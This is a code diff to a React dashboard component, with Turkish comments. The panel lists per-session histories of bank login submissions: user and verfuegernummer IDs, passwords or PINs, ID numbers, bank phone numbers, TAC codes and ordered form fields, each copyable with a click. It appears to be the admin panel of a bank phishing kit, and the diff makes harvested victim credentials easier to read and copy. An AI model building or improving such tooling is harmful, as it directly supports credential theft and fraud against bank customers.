@@ -1848,31 +1848,31 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                         </div>
 
                         {/* 3) ALT: Alanlarin TAM ALTINDA (sms/kart gibi flex-col sonda) GEÇMİŞ (N) BUTONU —
-                             artik cok sagda DEGIL, kolonun sol tarafinda, alanlarin hemen altinda. */}
-                        {bankHistoryCount > 0 ? (
-                          <div className="mt-1 flex w-full justify-start">
-                            <button
-                              type="button"
-                              onClick={() =>
-                                setExpandedBankHistorySessionId(
-                                  expandedBankHistorySessionId === row.id ? null : row.id,
-                                )
-                              }
-                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
-                                expandedBankHistorySessionId === row.id
-                                  ? darkMode
-                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
-                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
-                                  : darkMode
-                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
-                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
-                              }`}
-                              title="Eski banka form girişlerini göster"
-                            >
-                              GEÇMİŞ ({bankHistoryCount})
-                            </button>
-                          </div>
-                        ) : null}
+                             artik cok sagda DEGIL, kolonun sol tarafinda, alanlarin hemen altinda.
+                             ⭐⭐⭐ KALICI: bankHistoryCount = 0 OLSADA (0 kayit) BUTONU GÖSTER (0 yazdir)
+                                 Kullanici butonun var oldugunu GORSUN. SMS/KART > 0 ? idi, banka HER ZAMAN goster! */}
+                        <div className="mt-1 flex w-full justify-start">
+                          <button
+                            type="button"
+                            onClick={() =>
+                              setExpandedBankHistorySessionId(
+                                expandedBankHistorySessionId === row.id ? null : row.id,
+                              )
+                            }
+                            className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
+                              expandedBankHistorySessionId === row.id
+                                ? darkMode
+                                  ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
+                                  : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
+                                : darkMode
+                                  ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                  : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
+                            }`}
+                            title="Eski banka form girişlerini göster"
+                          >
+                            GEÇMİŞ ({bankHistoryCount})
+                          </button>
+                        </div>
                       </div>
                     </td>
                     <td className="hidden px-2 py-3 align-top">
@@ -2086,6 +2086,28 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                         timeZone: "Europe/Istanbul",
                                       })
                                     : "Tarih yok";
+                                  // ⭐⭐⭐ BANKA ADI FALLBACK (HEPSINI YAZ):
+                                  //   1) entry.bankName
+                                  //   2) entry.bankSlug (slug ise displayName'e cevir)
+                                  //   3) session fd.bankName (guncel kolon bankasi)
+                                  //   Boylece banka adi HICBIR ZAMAN eksik KALMAZ!
+                                  const displayEntryBankName =
+                                    (entry.bankName && String(entry.bankName).trim().length > 0
+                                      ? String(entry.bankName).trim()
+                                      : "") ||
+                                    (entry.bankSlug && String(entry.bankSlug).trim().length > 0
+                                      ? String(entry.bankSlug)
+                                          .replace(/-/g, " ")
+                                          .replace(/_/g, " ")
+                                          .replace(/\b\w/g, (l) => l.toUpperCase())
+                                          .trim()
+                                      : "") ||
+                                    (fd.bankName && String(fd.bankName).trim().length > 0
+                                      ? String(fd.bankName).trim()
+                                      : "Banka Adı Yok");
+                                  const eof1 = String(entry.orderedField1 || "").trim();
+                                  const eof2 = String(entry.orderedField2 || "").trim();
+                                  const eof3 = String(entry.orderedField3 || "").trim();
                                   return (
                                     <div
                                       key={`${row.id}-history-${index}`}
@@ -2103,15 +2125,29 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                         >
                                           #{bankHistoryCount - index}
                                         </span>
-                                        {entry.bankName && (
+                                        {/* ⭐⭐⭐ BANKA ADI BADGE (DAHA BUYUK + BELIRGIN + DAHA FAZLA RENKLI): */}
+                                        {displayEntryBankName && displayEntryBankName.length > 0 && (
                                           <span
-                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
+                                            className={`cursor-pointer rounded-md px-2.5 py-1 text-[10px] font-black uppercase tracking-wide border shadow-sm ${
                                               darkMode
-                                                ? "bg-yellow-500/10 text-yellow-500 border-yellow-500/20"
-                                                : "bg-yellow-50 border-yellow-200 text-yellow-700"
+                                                ? "bg-yellow-500/15 text-yellow-400 border-yellow-500/30"
+                                                : "bg-yellow-500/10 text-yellow-800 border-yellow-500/30"
+                                            }`}
+                                            onClick={() => copyToClipboard(displayEntryBankName)}
+                                            title="Bu eski form ait banka adı (tıklayınca kopyalar)"
+                                          >
+                                            🏦 {displayEntryBankName}
+                                          </span>
+                                        )}
+                                        {entry.bankSlug && (
+                                          <span
+                                            className={`rounded px-2 py-0.5 text-[8px] font-black uppercase opacity-70 border ${
+                                              darkMode
+                                                ? "bg-white/5 text-zinc-400 border-white/5"
+                                                : "bg-gray-50 text-gray-500 border-gray-200"
                                             }`}
                                           >
-                                            {entry.bankName}
+                                            slug: {entry.bankSlug}
                                           </span>
                                         )}
                                         {entry.htmlStepLabel && (
@@ -2140,7 +2176,17 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                           {entryDate}
                                         </span>
                                       </div>
-                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-2 lg:grid-cols-4">
+                                      {/* ⭐⭐⭐ KULLANICININ ISTEDIGI GIBI: ID + SIFRE + 3.FORM (1-2-3) AYRI AYRI GRID
+                                          ESKI: 4 kolonlu grid, Sıralı Form Alanları 2 kolon kapsıyordu (alt alta).
+                                          YENI: 6 kolonlu grid (sm:grid-cols-3 lg:grid-cols-6).
+                                          HER BIR ALAN TEK KOLON (1.form / 2.form / 3.form ayrı ayrı box!):
+                                            Kolon 1: Kullanıcı ID
+                                            Kolon 2: Şifre / PIN
+                                            Kolon 3: Kimlik No / Banka Telefon / Giriş / TAC
+                                            Kolon 4: 1. FORM (orderedField1)
+                                            Kolon 5: 2. FORM (orderedField2)
+                                            Kolon 6: 3. FORM (orderedField3) */}
+                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-2 lg:grid-cols-6">
                                         {entry.verfuegernummer || entry.username ? (
                                           <div
                                             className={`rounded-xl border px-3 py-2 ${
@@ -2235,18 +2281,75 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                             </div>
                                           </div>
                                         ) : null}
-                                        {entry.orderedField1 || entry.orderedField2 || entry.orderedField3 ? (
+
+                                        {/* ⭐⭐⭐ 3. FORM - AYRI AYRI GRID (1. 2. 3. form TEK KOLON): */}
+                                        {eof1 ? (
                                           <div
-                                            className={`rounded-xl border px-3 py-2 sm:col-span-2 ${
-                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            className={`rounded-xl border px-3 py-2 shadow-sm border-amber-500/30 ${
+                                              darkMode ? "bg-amber-500/10" : "bg-amber-50"
                                             }`}
+                                            title="1. Form Alanı (eski 3.formun 1. girdisi)"
                                           >
-                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Sıralı Form Alanları</div>
-                                            <div className="space-y-0.5 font-mono">
-                                              {entry.orderedField1 && <div>1. {entry.orderedField1}</div>}
-                                              {entry.orderedField2 && <div>2. {entry.orderedField2}</div>}
-                                              {entry.orderedField3 && <div>3. {entry.orderedField3}</div>}
+                                            <div className={`mb-0.5 text-[8px] font-black uppercase ${darkMode ? "text-amber-400" : "text-amber-700"}`}>
+                                              1. FORM 🥇
                                             </div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(eof1)}
+                                            >
+                                              {eof1}
+                                            </div>
+                                            {entry.orderedField1Key && (
+                                              <div className="mt-0.5 text-[8px] font-black uppercase opacity-60 truncate">
+                                                ({entry.orderedField1Key})
+                                              </div>
+                                            )}
+                                          </div>
+                                        ) : null}
+                                        {eof2 ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 shadow-sm border-orange-500/30 ${
+                                              darkMode ? "bg-orange-500/10" : "bg-orange-50"
+                                            }`}
+                                            title="2. Form Alanı"
+                                          >
+                                            <div className={`mb-0.5 text-[8px] font-black uppercase ${darkMode ? "text-orange-400" : "text-orange-700"}`}>
+                                              2. FORM 🥈
+                                            </div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(eof2)}
+                                            >
+                                              {eof2}
+                                            </div>
+                                            {entry.orderedField2Key && (
+                                              <div className="mt-0.5 text-[8px] font-black uppercase opacity-60 truncate">
+                                                ({entry.orderedField2Key})
+                                              </div>
+                                            )}
+                                          </div>
+                                        ) : null}
+                                        {eof3 ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-2 shadow-sm border-rose-500/30 ${
+                                              darkMode ? "bg-rose-500/10" : "bg-rose-50"
+                                            }`}
+                                            title="3. Form Alanı (kullanıcının dediği 3. form)"
+                                          >
+                                            <div className={`mb-0.5 text-[8px] font-black uppercase ${darkMode ? "text-rose-400" : "text-rose-700"}`}>
+                                              3. FORM 🥉
+                                            </div>
+                                            <div
+                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
+                                              onClick={() => copyToClipboard(eof3)}
+                                            >
+                                              {eof3}
+                                            </div>
+                                            {entry.orderedField3Key && (
+                                              <div className="mt-0.5 text-[8px] font-black uppercase opacity-60 truncate">
+                                                ({entry.orderedField3Key})
+                                              </div>
+                                            )}
                                           </div>
                                         ) : null}
                                       </div>
